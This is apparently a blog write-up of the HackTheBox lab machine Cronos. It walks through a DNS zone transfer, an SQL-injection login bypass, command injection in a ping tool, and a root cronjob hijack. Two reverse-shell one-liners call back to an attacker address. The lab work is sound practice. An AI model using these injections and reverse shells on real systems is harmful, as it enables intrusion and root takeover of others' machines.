---
layout: post
title: HackTheBox&#58; Cronos
description: Writeup for HTB box Cronos.
category: HackTheBox
---

### Introduction

Cronos is a Linux box, difficulty Medium on HTB.

The box is quite easy.
For user, we use DNS Zone Transfer to find an admin subdomain with a login panel.
After using SQL Injection to gain access, we can do command injection to get the shell.
For root, we detect and inject command to a root cronjob.

### Initial Scan

![Cronos-1](/resources/Cronos-1.png)

### User: DNS Zone Transfer, SQL Injection and Command Injection

Looking from nmap scan result, we see DNS service open on port 53 but with TCP instead of UDP.
This might suggest the DNS service allows [DNS Zone Transfer](https://en.wikipedia.org/wiki/DNS_zone_transfer).
We can test this with `dig`.
``` bash
dig axfr cronos.htb @cronos.htb
```
And we get some hits back: A record for cronos.htb, www.cronos.htb, ns1.cronos.htb and admin.cronos.htb.
![Cronos-2](/resources/Cronos-2.png)

Checking admin.cronos.htb, we find a simple login page.
First try with SQL Injection using username `admin' #` and any passwords gives us access to the Net Tool v0.1 panel.

There are 2 options: traceroute and ping.
Looiking at the source code we can see value for `command` sending over POST is either `traceroute` or `ping -c 1`.
This suggests this value is later executed as bash command.
We can test for command injection with `;`
```bash
(ping -c 1) 10.10.14.25; id
```
![Cronos-3](/resources/Cronos-3.png)

Indeed we get a RCE and we can change the payload into a reverse shell as wwww-data and we can read user.txt.
```bash
(ping -c 1) 10.10.14.25; rm /tmp/k4; mkfifo /tmp/k4; cat /tmp/k4|/bin/sh -i 2>&1|nc 10.10.14.25 1337 > /tmp/k4
```

### Privesc: Root PHP Cronjob

Just like the name suggests, the machine might be running a root cronjob.
Using [pspy](https://github.com/DominicBreuker/pspy), we can detect the cronjob being run every minute.
```bash
php /var/www/laravel/artisan schedule:run
/bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```
![Cronos-4](/resources/Cronos-4.png)

We have owner read/write permission on `/var/www/laravel/artisan`, which means we just need to inject a PHP reverse shell payload.
Wait 1 minute to get root shell and we can read root.txt.
```bash
rm /tmp/k5; mkfifo /tmp/k5; cat /tmp/k5|/bin/sh -i 2>&1|nc 10.10.14.25 1337 > /tmp/k5
```
![Cronos-5](/resources/Cronos-5.png)
